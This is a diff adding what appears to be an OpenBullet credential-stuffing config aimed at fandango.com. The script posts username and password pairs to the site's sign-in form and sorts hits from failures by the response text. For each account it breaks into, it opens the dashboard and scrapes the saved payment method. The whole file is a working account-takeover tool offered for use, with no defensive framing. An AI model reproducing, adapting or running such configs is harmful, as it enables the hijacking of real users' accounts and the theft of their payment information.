@@ -1,0 +1,63 @@
+[SETTINGS]
+{
+  "Name": "fandango.com",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-27T22:52:56.6312734+02:00",
+  "AdditionalInfo": "",
+  "Author": "Acemy#7578",
+  "Version": "1.1.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.fandango.com/account/signin" 
+  CONTENT "__EVENTTARGET=ctl00%24GlobalBody%24SignOnControl%24SignInButton&__EVENTARGUMENT=&__VIEWSTATE=Xczc4E4kL6alKhCNi6apNzJ%2BbpD3d8RPHDG6mNCSBDKvVsKXPJJs2bBt2YWCIw%2FMQB6Glkmo9vYQnOV3XL7iqlXpDxw%3D&ctl00%24GlobalBody%24SignOnControl%24UsernameBox=<USER>&ctl00%24GlobalBody%24SignOnControl%24PasswordBox=<PASS>&ctl00%24GlobalBody%24SignOnControl%24CaptchEnabledField=&__VIEWSTATEGENERATOR=8231AAFB&__VIEWSTATEENCRYPTED=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "authority: www.fandango.com" 
+  HEADER "method: POST" 
+  HEADER "path: /account/signin?from=%2F%3Faccounttype%3Demail%26login%3Dsuccess" 
+  HEADER "scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "origin: https://www.fandango.com" 
+  HEADER "referer: https://www.fandango.com/account/signin?from=%2F%3Faccounttype%3Demail%26login%3Dsuccess" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Sign Out" 
+  KEYCHAIN Failure OR 
+    KEY "That email and password don't match our records. Please try again" 
+
+REQUEST GET "https://www.fandango.com/account/dashboard" 
+  
+  HEADER "referer: https://www.fandango.com/?accounttype=email&login=success" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "authority: www.fandango.com" 
+  HEADER "method: GET" 
+  HEADER "path: /account/dashboard" 
+  HEADER "scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+
+PARSE "<SOURCE>" LR "<h2 class=\"heading-style-1 heading-size-m\">Payment Method</h2>" "</p>" -> VAR "PAYMENT" 
+
+FUNCTION Replace "<p>" " " "<PAYMENT>" -> VAR "PAYMENT METHOD1" 
+
+FUNCTION Replace "<br />" " " "<PAYMENT METHOD1>" -> CAP "PAYMENT METHOD" 
+
